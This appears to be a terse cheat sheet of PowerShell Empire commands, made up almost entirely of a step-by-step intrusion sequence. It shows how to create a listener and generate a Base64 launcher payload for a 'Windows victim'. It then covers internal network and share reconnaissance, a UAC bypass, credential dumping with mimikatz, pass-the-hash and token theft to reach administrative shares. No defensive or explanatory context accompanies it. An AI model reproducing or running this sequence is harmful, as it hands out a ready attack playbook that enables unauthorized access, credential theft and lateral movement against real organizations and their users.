#Create listener and generate Base64 cmd payload
sudo ./empire
liste­ners
set Name listen­ername
execute
usestager launcher listen­ername
execute (generate payload, copy & paste into cmd on Windows victim)
agents

#Post Exploi­tation
agents
interact AGENTNAME
sysinfo
usemodule situat­ion­al_­awa­ren­ess­/ne­two­rk/­arp­scan
set Range 10.0.0.0-­10.0.0.255
execute
...
usemodule situat­ion­al_­awa­ren­ess­/ne­two­rk/­rev­ers­e_dns
set Range 10.0.0.0-­10.0.0.255
execute
...
usemodule situat­ion­al_­awa­ren­ess­/ne­two­rk/­pow­erv­iew­/us­er_­hunter
execute
...
usemodule situat­ion­al_­awa­ren­ess­/ne­two­rk/­pow­erv­iew­/sh­are­_fi­nder
set CheckS­har­eAccess True
execute
...
agents
interact AGENTNAME
bypassuac LISTEN­ERNAME
y
...wait for agent now active to appear...
agents (look for a user with * as this indicates admin)
interact AGENTNAME
mimikatz (collect creds, etc...)
creds
dir \\COMP­UTE­RNA­ME\C$
creds
pth 1 (passt­hehash using cred 1, a PID will be created)
steal­_token PIDNUM
dir \\COMP­UTE­RNA­ME\C$